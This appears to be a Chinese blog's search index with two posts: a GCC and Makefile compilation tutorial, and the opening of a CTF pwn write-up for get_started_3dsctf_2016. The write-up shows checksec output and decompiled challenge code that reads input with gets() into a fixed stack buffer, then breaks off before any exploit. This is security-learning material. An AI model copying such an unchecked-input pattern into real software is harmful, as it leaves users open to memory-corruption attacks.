<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>GNU Makefile编译C/C++(Linux系统、VSCODE)</title>
    <url>/2023/04/17/GNU-Makefile%E7%BC%96%E8%AF%91C-C-Linux%E7%B3%BB%E7%BB%9F%E3%80%81VSCODE/</url>
    <content><![CDATA[<p><a href="https://github.com/liheqian1993/GNC-Tutorial">文章改动</a></p>
<h1 id="GCC简介"><a href="#GCC简介" class="headerlink" title="GCC简介"></a>GCC简介</h1><p><a href="https://gcc.gnu.org/onlinedocs/">GCC 官方文档网站</a></p>
<p>GCC（GNU Compiler Collection，GNU编译程序集合）是最重要的开放源码软件。其他所有开放源码软件都在某种层次上依赖于它。甚至其他语言，例如 Python，都是由 C 语言开发的，由 GNU 编译程序编译的。这个软件对于整个自由软件运动而言具有根本性的意义。如果没有它或类似的软件，就不可能有自由软件运动。GCC 为 Linux 的出现提供了可能性。GCC 是由许多组件组成的，但它们也并不总是出现的。有些部分是和语言相关的，所以如果没有安装某种特定语言，系统中就不会出现相关的文件。</p>
<p><strong>常见组成部分</strong> </p>
<ul>
<li><strong>c++：</strong> gcc 的一个版本，默认语言设置为 C++，而且在链接的时候自动包含标准 C++ 库。这和 g++ 一样</li>
<li><strong>configure：</strong> GCC 源代码树根目录中的一个脚本。用于设置配置值和创建 GCC 编译程序必需的 make 程序文件</li>
<li><strong>g++：</strong> gcc 的一个版本，默认语言设置为 C++，而且在链接的时候自动包含标准 C++库。这和 c++ 一样</li>
<li><strong>gcc：</strong> 该驱动程序等同于执行编译程序和连接程序以产生需要的输出</li>
<li><strong>libgcc：</strong> 该库包含的例程被作为编译程序的一部分，是因为它们可被链接到实际的可执行程序中。它们是特殊的例程，链接到可执行程序，来执行基本的任务，例如浮点运算。这些库中的例程通常都是平台相关的</li>
<li><strong>libstdc++：</strong> 运行时库，包括定义为标准语言一部分的所有的 C++类和函数</li>
</ul>
<p><strong>包含的常见软件</strong></p>
<ul>
<li><strong>ar：</strong> 这是一个程序，可通过从文档中增加、删除和析取文件来维护库文件。通常使用该工具是为了创建和管理连接程序使用的目标库文档。该程序是 binutils 包的一部分</li>
<li><strong>as：</strong> GNU 汇编器。实际上它是一族汇编器，因为它可以被编译或能够在各种不同平台上工作。该程序是 binutjls 包的一部分 autoconf：产生的 shell 脚本自动配置源代码包去编译某个特定版本的 UNIX</li>
<li><strong>gdb：</strong> GNU 调试器，可用于检查程序运行时的值和行为 GNATS：GNU 的调试跟踪系统（GNU Bug Tracking System）。一个跟踪 GCC和其他 GNU 软件问题的在线系统</li>
<li><strong>gprof：</strong> 该程序会监督编译程序的执行过程，并报告程序中各个函数的运行时间，可以根据所提供的配置文件来优化程序。该程序是 binutils 包的一部分</li>
<li><strong>ld：</strong> GNU 连接程序。该程序将目标文件的集合组合成可执行程序。该程序是 binutils 包的一部分</li>
<li><strong>libtool：</strong> 一个基本库，支持 make 程序的描述文件使用的简化共享库用法的脚本</li>
<li><strong>make：</strong> 一个工具程序，它会读 makefile 脚本来确定程序中的哪个部分需要编译和连接，然后发布必要的命令。它读出的脚本（叫做 makefile 或 Makefile）定义了文件关系和依赖关系</li>
</ul>
<p><strong>GCC默认头文件搜索路径</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> | gcc -v -x c -E -</span><br></pre></td></tr></table></figure>

<ul>
<li>&#x2F;usr&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;7&#x2F;include</li>
<li>&#x2F;usr&#x2F;local&#x2F;include</li>
<li>&#x2F;usr&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;7&#x2F;include-fixed</li>
<li>&#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu</li>
<li>&#x2F;usr&#x2F;include</li>
</ul>
<h1 id="简单编译原理"><a href="#简单编译原理" class="headerlink" title="简单编译原理"></a>简单编译原理</h1><h2 id="1-hello-world在计算机的表示"><a href="#1-hello-world在计算机的表示" class="headerlink" title="1 hello, world在计算机的表示"></a>1 hello, world在计算机的表示</h2><p>hello 程序的生命周期是从一个源程序（或者说源文件）开始的，程序员通过编辑器创建并保存的文本文件，文件名是 hello.c。源程序实际上就是一个由值 0 和 1组成的位（又称为比特）序列，8 个位被组织成一组，称为字节。每个字节表示程序中的某些文本字符</p>
<p>大部分计算机使用 ASCII 标准来表示文本字符</p>
<ul>
<li>用一个唯一的单字节大小的整数值息来表示每个字符</li>
<li>hello.c 程序是以字节序列的方式储存在文件中的</li>
</ul>
<p>hello.c 的表示方法说明了一个基本思想∶ 系统中所有的信息——包括磁盘文件、内存中的程序、内存中存放的用户数据以及网络上传送的数据，都是由一串比特表示</p>
<p>![img](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-04-17 102936.png)</p>
<h2 id="2-编译过程"><a href="#2-编译过程" class="headerlink" title="2 编译过程"></a>2 编译过程</h2><p>hello 程序的生命周期从一个高级 C 语言程序开始</p>
<p>为了在系统上运行 hello.c 程序，每条 C 语句都必须被其他程序转化为一系列的低级机器语言指令</p>
<p>然后这些指令按照一种称为可执行目标程序的格式打好包，并以二进制磁盘文件的形式存放起来</p>
<p>GCC 编译器读取源程序文件 hello.c，并把它翻译成一个可执行目标文件 hello。这个翻译过程可分为四个阶段完成，如下图所示</p>
<p>执行这四个阶段的程序（预处理器、编译器、汇编器和链接器）一起构成了编译系统（compilation system）</p>
<p>![img](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-04-17 102947.png)</p>
<p> </p>
<h3 id="2-1-预处理阶段"><a href="#2-1-预处理阶段" class="headerlink" title="2.1 预处理阶段"></a>2.1 预处理阶段</h3><p><code>预处理器（cpp）</code>根据以字符#开头的命令，修改原始的 C 程序。比如 hello.c中第 1行的#include &lt; stdio.h&gt;命令告诉<strong>预处理器读取系统头文件 stdio.h 的内容，并把它直接插入程序文本中。</strong>结果就得到了另一个 C程序，通常是以.i作为文件扩展名。</p>
<h3 id="2-2-编译阶段"><a href="#2-2-编译阶段" class="headerlink" title="2.2 编译阶段"></a>2.2 编译阶段</h3><p><code>编译器（ccl）</code>将文本文件 hello.i翻译成文本文件 hello.s，它包含一 个汇编语言程序。该程序包含函数 main 的定义，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">main:</span><br><span class="line">subq    $8, %rsp </span><br><span class="line">mov1    $.LCO,%edi </span><br><span class="line">call    puts </span><br><span class="line">mov1    $0,%eax </span><br><span class="line">addq    $8,%rsp </span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>每条语句都以一种文本格式描述了一条低级机器语言指令。汇编语言非常有用，它为不同高级语言的不同编译器提供了通用的输出语言</p>
<h3 id="2-3-汇编阶段"><a href="#2-3-汇编阶段" class="headerlink" title="2.3 汇编阶段"></a>2.3 汇编阶段</h3><p><code>汇编器（as）</code>将 hello.s 翻译成机器语言指令，把这些指令打包成一种叫做可重定位目标程序（relocatable object program）的格式，并将结果保存在目标文件 hello.o中。</p>
<p>hello.o 文件是一个二进制文件，它包含的17 个字节是函数 main的指令编码。如果我们在文本编辑器中打开 hello.o文件，将看到一堆乱码。</p>
<h3 id="2-4-链接阶段"><a href="#2-4-链接阶段" class="headerlink" title="2.4 链接阶段"></a>2.4 链接阶段</h3><p>注意，hello程序调用了 printf 函数，它是每个 C 编译器都提供的标准 C 库中的一个函数。printf 函数存在于一个名为 printf.o 的单独的预编译好了的目标文件中，而这个文件必须以某种方式合并到我们的 hello.o 程序中。</p>
<p><code>链接器（ld）</code>就负责处理这种合并。结果就得到 hello 文件，它是一个可执行目标文件（或者简称为可执行文件），可以被加载到内存中，由系统执行。</p>
<h2 id="3-hello-world的执行过程"><a href="#3-hello-world的执行过程" class="headerlink" title="3 hello, world的执行过程"></a>3 hello, world的执行过程</h2><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><ul>
<li>shell 等待我们输入一个命令</li>
<li>当我们在键盘上输入字符串”.&#x2F;hello”（注意这里是编译好的可执行目标文件）后</li>
<li>shell 程序将字符逐一读入寄存器</li>
<li>再把它存放到内存中</li>
</ul>
<p>![img](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-04-17 102955.png)</p>
<p> </p>
<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><ul>
<li>当我们在键盘上敲回车键时，shell 程序就知道我们已经结束了命令的输人</li>
<li>然后 shell 执行一系列指令来加载可执行的 hello 文件</li>
<li>这些指令将 hello 目标文件中的代码和数据从磁盘复制到主存</li>
<li>数据包括最终会被输出的字符串”hello，world\n”。</li>
</ul>
<p>![img](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-04-17 103000.png)</p>
<p> </p>
<h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><ul>
<li>一旦目标文件 hello 中的代码和数据被加载到主存</li>
<li>处理器就开始执行 hello 程序的 main 程序中的机器语言指令</li>
<li>这些指令将 “hello，world\n” 字符串中的字节从主存复制到寄存器文件</li>
<li>再从寄存器文件中复制到显示设备，最终显示在屏幕上</li>
</ul>
<p>![img](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-04-17 103005.png)</p>
<p> </p>
<p> </p>
<h2 id="4-程序在计算机内的存储"><a href="#4-程序在计算机内的存储" class="headerlink" title="4 程序在计算机内的存储"></a>4 程序在计算机内的存储</h2><ul>
<li>hello程序的机器指令最初是存放在磁盘上</li>
<li>当程序加载时，它们被复制到主存</li>
<li>当处理器运行程序时，指令又从主存复制到处理器</li>
</ul>
<p>相似地，数据串 “hello，world\n”开始时在磁盘上，然后被复制到主存，最后从主存上复制到显示设备</p>
<h1 id="C语言的编译"><a href="#C语言的编译" class="headerlink" title="C语言的编译"></a>C语言的编译</h1><p>编译 C 语言相关的后缀</p>
<blockquote>
<p>.a 静态库文件</p>
<p>.c 源文件</p>
<p>.h 头文件</p>
<p>.i  预处理文件</p>
<p>.o 目标文件</p>
<p>.s 汇编语言文件</p>
<p>.so 动态库 共享库有 运行时库 文件</p>
</blockquote>
<h2 id="2-Compiling-C"><a href="#2-Compiling-C" class="headerlink" title="2 Compiling C"></a>2 Compiling C</h2><h3 id="2-1-Preprocessing"><a href="#2-1-Preprocessing" class="headerlink" title="2.1 Preprocessing"></a>2.1 Preprocessing</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不会生成 .i 文件</span></span><br><span class="line">gcc -E main.c</span><br><span class="line">gcc -E main.c -o helloworld.i</span><br></pre></td></tr></table></figure>

<ul>
<li>-E 选项告诉编译器只进行预处理操作</li>
<li>-o 选项把预处理的结果输出到指定文件</li>
</ul>
<p> </p>
<h3 id="2-2-Generating-Assembly-Language"><a href="#2-2-Generating-Assembly-Language" class="headerlink" title="2.2 Generating Assembly Language"></a>2.2 Generating Assembly Language</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -S main.c</span><br><span class="line">gcc -S main.c -o xxx.s</span><br></pre></td></tr></table></figure>

<ul>
<li>-S 选项告诉编译器，进行预处理和编译成汇编语言操作</li>
</ul>
<p>每个平台对应的汇编语言的形式是不同的，例如有很多型号的开发板，有很多型号的 CPU</p>
<h3 id="2-3-Source-File-to-Object-File"><a href="#2-3-Source-File-to-Object-File" class="headerlink" title="2.3 Source File to Object File"></a>2.3 Source File to Object File</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -c main.c</span><br><span class="line">gcc -c main.c -o xxx.o</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译多个 .c 文件</span></span><br><span class="line">gcc -c main.c add.c minus.c</span><br></pre></td></tr></table></figure>

<h3 id="2-4-Single-Source-to-Executable"><a href="#2-4-Single-Source-to-Executable" class="headerlink" title="2.4 Single Source to Executable"></a>2.4 Single Source to Executable</h3><ul>
<li>注意：后面三个命令执行后并没有按编译过程出现 .i .s 或 .o 文件，并不意味着没有经历这些过程</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc main.c</span><br><span class="line">gcc main.c -o xxx</span><br></pre></td></tr></table></figure>

<p>执行程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./可执行文件</span><br></pre></td></tr></table></figure>

<h3 id="2-5-Multiple-Sources-to-Executable"><a href="#2-5-Multiple-Sources-to-Executable" class="headerlink" title="2.5 Multiple Sources to Executable"></a>2.5 Multiple Sources to Executable</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc main.c add.c minus.c -o exec</span><br><span class="line">./exec</span><br></pre></td></tr></table></figure>

<h2 id="3-Creating-a-Static-Library"><a href="#3-Creating-a-Static-Library" class="headerlink" title="3 Creating a Static Library"></a>3 Creating a Static Library</h2><ul>
<li><p>编译成 .o 的文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -c [.c] -o [自定义文件名] </span><br><span class="line">gcc -c [.c] [.c] ...</span><br></pre></td></tr></table></figure>
</li>
<li><p>编静态库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ar -r [lib自定义库名.a] [.o] [.o] ...</span><br></pre></td></tr></table></figure>
</li>
<li><p>链接成可执行文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc [.c] [.a] -o [自定义输出文件名]</span><br><span class="line">gcc [.c] -o [自定义输出文件名] -l[库名] -L[库所在路径]</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="4-Creating-a-Shared-Library"><a href="#4-Creating-a-Shared-Library" class="headerlink" title="4 Creating a Shared Library"></a>4 Creating a Shared Library</h2><blockquote>
<p>编译二进制.o文件</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -c -fpic [.c/.cpp][.c/.cpp]... </span><br></pre></td></tr></table></figure>

<blockquote>
<p>编库</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared [.o][.o]... -o [lib自定义库名.so]</span><br></pre></td></tr></table></figure>

<ul>
<li>链接库到可执行文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc [.c/.cpp] -o [自定义可执行文件名]  -l[库名] -L[库路径] -Wl,-rpath=[库路径]</span><br></pre></td></tr></table></figure>

<h1 id="C-的编译"><a href="#C-的编译" class="headerlink" title="C++的编译"></a>C++的编译</h1><p>编译c++的相关后缀</p>
<blockquote>
<p>.a  静态库</p>
<p>.c .c++ .cc .cp .cpp .cxx </p>
<p>.h 头文件</p>
<p>.hpp 头文件</p>
<p>.ii 与处理文件</p>
<p>.o 目标文件</p>
<p>.so 动态库</p>
<p>.s 汇编语言文件</p>
</blockquote>
<h2 id="2-Compiling-C-1"><a href="#2-Compiling-C-1" class="headerlink" title="2 Compiling C++"></a>2 Compiling C++</h2><h3 id="2-1-Preprocessing-1"><a href="#2-1-Preprocessing-1" class="headerlink" title="2.1 Preprocessing"></a>2.1 Preprocessing</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g++ -E helloworld.c</span><br><span class="line">g++ -E helloworld.c -o helloworld.i</span><br></pre></td></tr></table></figure>

<ul>
<li>-E 选项告诉编译器只进行预处理操作</li>
<li>-o 选项把预处理的结果输出到指定文件</li>
</ul>
<h3 id="2-2-Generating-Assembly-Language-1"><a href="#2-2-Generating-Assembly-Language-1" class="headerlink" title="2.2 Generating Assembly Language"></a>2.2 Generating Assembly Language</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g++ -S helloworld.c</span><br><span class="line">g++ -S helloworld.c -o helloworld.s</span><br></pre></td></tr></table></figure>

<ul>
<li>-S 选项告诉编译器，进行预处理和编译成汇编语言操作</li>
</ul>
<p>每个平台对应的汇编语言的形式是不同的，例如有很多型号的开发板，有很多型号的 CPU </p>
<h3 id="2-3-Source-File-to-Object-File-1"><a href="#2-3-Source-File-to-Object-File-1" class="headerlink" title="2.3 Source File to Object File"></a>2.3 Source File to Object File</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g++ -c helloworld.c</span><br><span class="line">g++ -c helloworld.c -o harumph.o</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译多个 .c 文件</span></span><br><span class="line">g++ -c helloworld.c helloworld1.c helloworld2.c</span><br></pre></td></tr></table></figure>

<h3 id="2-4-Single-Source-to-Executable-1"><a href="#2-4-Single-Source-to-Executable-1" class="headerlink" title="2.4 Single Source to Executable"></a>2.4 Single Source to Executable</h3><ul>
<li>注意：后面三个命令执行后并没有按编译过程出现 .i .s 或 .o 文件，并不意味着没有经历这些过程</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g++ helloworld.c</span><br><span class="line">g++ helloworld.c -o howdy</span><br></pre></td></tr></table></figure>

<p>执行程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./可执行文件</span><br></pre></td></tr></table></figure>

<h3 id="2-5-Multiple-Source-to-Executable"><a href="#2-5-Multiple-Source-to-Executable" class="headerlink" title="2.5 Multiple Source to Executable"></a>2.5 Multiple Source to Executable</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ g++ hellomain.c sayhello.c -o hello</span><br></pre></td></tr></table></figure>

<h2 id="3-Creating-a-Static-Library-1"><a href="#3-Creating-a-Static-Library-1" class="headerlink" title="3 Creating a Static Library"></a>3 Creating a Static Library</h2><ul>
<li><p>编译成 .o 的文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g++ -c [.c] -o [自定义文件名] </span><br><span class="line">g++ -c [.c] [.c] ...</span><br></pre></td></tr></table></figure>
</li>
<li><p>编静态库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ar -r [lib自定义库名.a] [.o] [.o] ...</span><br></pre></td></tr></table></figure>
</li>
<li><p>链接成可执行文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g++ [.c] [.a] -o [自定义输出文件名]</span><br><span class="line">g++ [.c] -o [自定义输出文件名] -l[库名] -L[库所在路径]</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="4-Creating-a-Shared-Library-1"><a href="#4-Creating-a-Shared-Library-1" class="headerlink" title="4 Creating a Shared Library"></a>4 Creating a Shared Library</h2><ul>
<li><p>编译二进制.o文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g++ -c -fpic [.c/.cpp][.c/.cpp]... </span><br></pre></td></tr></table></figure>
</li>
<li><p>编库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g++ -shared [.o][.o]... -o [lib自定义库名.so]</span><br></pre></td></tr></table></figure>
</li>
<li><p>连接动态库到可执行文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g++ [.c/.cpp] -o [自定义可执行文件名]  -l[库名] -L[库路径] -Wl,-rpath=[库路径]</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="makefile"><a href="#makefile" class="headerlink" title="makefile"></a>makefile</h1><ul>
<li>GNU Make 官方网站：<a href="https://www.gnu.org/software/make/">https://www.gnu.org/software/make/</a></li>
<li>GNU Make 官方文档下载地址：<a href="https://www.gnu.org/software/make/manual/">https://www.gnu.org/software/make/manual/</a></li>
<li>Makefile Tutorial：<a href="https://makefiletutorial.com/">https://makefiletutorial.com/</a></li>
</ul>
<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><h3 id="1-基本格式"><a href="#1-基本格式" class="headerlink" title="1 基本格式"></a>1 基本格式</h3><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">targets : prerequisties</span><br><span class="line">[tab键]command</span><br></pre></td></tr></table></figure>

<ul>
<li>target：目标文件，可以是 OjectFile，也可以是执行文件，还可以是一个标签（Label），对于标签这种特性，在后续的“伪目标”章节中会有叙述。</li>
<li>prerequisite：要生成那个 target 所需要的文件或是目标。</li>
<li>command：是 make 需要执行的命令，</li>
</ul>
<h3 id="2-Makefile-规则"><a href="#2-Makefile-规则" class="headerlink" title="2 Makefile 规则"></a>2 Makefile 规则</h3><ul>
<li>make 会在当前目录下找到一个名字叫 <code>Makefile</code> 或 <code>makefile</code> 的文件</li>
<li>如果找到，它会找文件中第一个目标文件（target），并把这个文件作为最终的目标文件</li>
<li>如果 target 文件不存在，或是 target 文件依赖的 .o 文件(prerequities)的文件修改时间要比 target 这个文件新，就会执行后面所定义的命令 command 来生成 target 这个文件</li>
<li>如果 target 依赖的 .o 文件（prerequisties）也存在，make 会在当前文件中找到 target 为 .o 文件的依赖性，如果找到，再根据那个规则生成 .o 文件</li>
</ul>
<h3 id="3-伪目标"><a href="#3-伪目标" class="headerlink" title="3 伪目标"></a>3 伪目标</h3><p>“伪目标” 不是一个文件，只是一个标签。我们要显示地指明这个 “目标” 才能让其生效</p>
<p>“伪目标” 的取名不能和文件名重名，否则不会执行命令</p>
<p>为了避免和文件重名的这种情况，我们可以使用一个特殊的标记 <code>.PHONY</code> 来显示地指明一个目标是“伪目标”，向 make 说明，不管是否有这个文件，这个目标就是 “伪目标”</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">.PHONY : clean</span><br></pre></td></tr></table></figure>

<p>只要有这个声明，不管是否有“clean”文件，要运行 “clean” 这个目标，只有”make clean” 这个命令</p>
<h2 id="Variable"><a href="#Variable" class="headerlink" title="Variable"></a>Variable</h2><p>变量在声明时需要给予初值，而在使用时，需要给在变量名前加上 <code>$</code> 符号，并用小括号 <code>()</code> 把变量给包括起来。</p>
<h3 id="1-变量的定义"><a href="#1-变量的定义" class="headerlink" title="1 变量的定义"></a>1 变量的定义</h3><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">cpp := src/main.cpp </span><br><span class="line">obj := objs/main.o</span><br></pre></td></tr></table></figure>

<h3 id="2-变量的引用"><a href="#2-变量的引用" class="headerlink" title="2 变量的引用"></a>2 变量的引用</h3><ul>
<li>可以用 <code>()</code> 或 <code>&#123;&#125;</code></li>
</ul>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">cpp := src/main.cpp </span><br><span class="line">obj := objs/main.o</span><br><span class="line"></span><br><span class="line"><span class="variable">$(obj)</span> : $&#123;cpp&#125;</span><br><span class="line">	@g++ -c <span class="variable">$(cpp)</span> -o <span class="variable">$(obj)</span></span><br><span class="line"></span><br><span class="line">compile : <span class="variable">$(obj)</span></span><br></pre></td></tr></table></figure>

<h3 id="3-预定义变量"><a href="#3-预定义变量" class="headerlink" title="3 预定义变量"></a>3 预定义变量</h3><ul>
<li><code>$@</code>: 目标(target)的完整名称</li>
<li><code>$&lt;</code>: 第一个依赖文件（prerequisties）的名称</li>
<li><code>$^</code>: 所有的依赖文件（prerequisties），以空格分开，不包含重复的依赖文件</li>
</ul>
<figure class="highlight make"><table><tr><td class="code"><pre><span class="line">cpp := src/main.cpp </span><br><span class="line">obj := objs/main.o</span><br><span class="line"></span><br><span class="line"><span class="variable">$(obj)</span> : $&#123;cpp&#125;</span><br><span class="line">	@g++ -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line">	@echo <span class="variable">$^</span></span><br><span class="line"></span><br><span class="line">compile : <span class="variable">$(obj)</span></span><br><span class="line">.PHONY : compile</span><br></pre></td></tr></table></figure>

<h2 id="Operator-amp-Symbols"><a href="#Operator-amp-Symbols" class="headerlink" title="Operator&amp;Symbols"></a>Operator&amp;Symbols</h2><h3 id="1-x3D"><a href="#1-x3D" class="headerlink" title="1 &#x3D;"></a>1 &#x3D;</h3><ul>
<li>简单的赋值运算符</li>
<li>用于将右边的值分配给左边的变量</li>
<li>如果在后面的语句中重新定义了该变量，则将使用新的值</li>
</ul>
<blockquote>
<p>示例</p>
</blockquote>
<figure class="highlight make"><table><tr><td class="code"><pre><span class="line">HOST_ARCH   = aarch64</span><br><span class="line">TARGET_ARCH = <span class="variable">$(HOST_ARCH)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更改了变量 a</span></span><br><span class="line">HOST_ARCH   = amd64</span><br><span class="line"></span><br><span class="line"><span class="section">debug:</span></span><br><span class="line">	@echo <span class="variable">$(TARGET_ARCH)</span></span><br></pre></td></tr></table></figure>

<h3 id="2-x3D"><a href="#2-x3D" class="headerlink" title="2 :&#x3D;"></a>2 :&#x3D;</h3><ul>
<li>立即赋值运算符</li>
<li>用于在定义变量时立即求值</li>
<li>该值在定义后不再更改</li>
<li>即使在后面的语句中重新定义了该变量</li>
</ul>
<blockquote>
<p>示例</p>
</blockquote>
<figure class="highlight make"><table><tr><td class="code"><pre><span class="line">HOST_ARCH   := aarch64</span><br><span class="line">TARGET_ARCH := <span class="variable">$(HOST_ARCH)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更改了变量 a</span></span><br><span class="line">HOST_ARCH := amd64</span><br><span class="line"></span><br><span class="line"><span class="section">debug:</span></span><br><span class="line">	@echo <span class="variable">$(TARGET_ARCH)</span></span><br></pre></td></tr></table></figure>

<p> </p>
<h3 id="3-x3D"><a href="#3-x3D" class="headerlink" title="3 ?&#x3D;"></a>3 ?&#x3D;</h3><ul>
<li>默认赋值运算符</li>
<li>如果该变量已经定义，则不进行任何操作</li>
<li>如果该变量尚未定义，则求值并分配</li>
</ul>
<figure class="highlight make"><table><tr><td class="code"><pre><span class="line">HOST_ARCH  = aarch64</span><br><span class="line">HOST_ARCH ?= amd64</span><br><span class="line"></span><br><span class="line"><span class="section">debug:</span></span><br><span class="line">    @echo <span class="variable">$(HOST_ARCH)</span></span><br></pre></td></tr></table></figure>

<p> </p>
<h3 id="4-累加-x3D"><a href="#4-累加-x3D" class="headerlink" title="4 累加 +&#x3D;"></a>4 累加 +&#x3D;</h3><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CXXFLAGS := -m64 -fPIC -g -O0 -std=c++11 -w -fopenmp</span><br><span class="line"></span><br><span class="line">CXXFLAGS += <span class="variable">$(include_paths)</span></span><br></pre></td></tr></table></figure>

<p> </p>
<h3 id="5"><a href="#5" class="headerlink" title="5 \"></a>5 \</h3><ul>
<li>续行符</li>
</ul>
<blockquote>
<p>示例</p>
</blockquote>
<figure class="highlight make"><table><tr><td class="code"><pre><span class="line">LDLIBS := cudart opencv_core \</span><br><span class="line">          gomp nvinfer protobuf cudnn pthread \</span><br><span class="line">          cublas nvcaffe_parser nvinfer_plugin </span><br></pre></td></tr></table></figure>

<p> </p>
<h3 id="6-与"><a href="#6-与" class="headerlink" title="6 * 与 %"></a>6 * 与 %</h3><ul>
<li><code>*</code>: 通配符表示匹配任意字符串，可以用在目录名或文件名中</li>
<li><code>%</code>: 通配符表示匹配任意字符串，并将匹配到的字符串作为变量使用</li>
</ul>
<h2 id="functions"><a href="#functions" class="headerlink" title="functions"></a>functions</h2>]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn栈刷题记录</title>
    <url>/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="栈问题"><a href="#栈问题" class="headerlink" title="栈问题"></a>栈问题</h1><h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><p><strong>checksec</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>



<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">56</span>]; <span class="comment">// [esp+4h] [ebp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Qual a palavrinha magica? &quot;</span>, v4[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">gets</span>(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">get_flag</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// 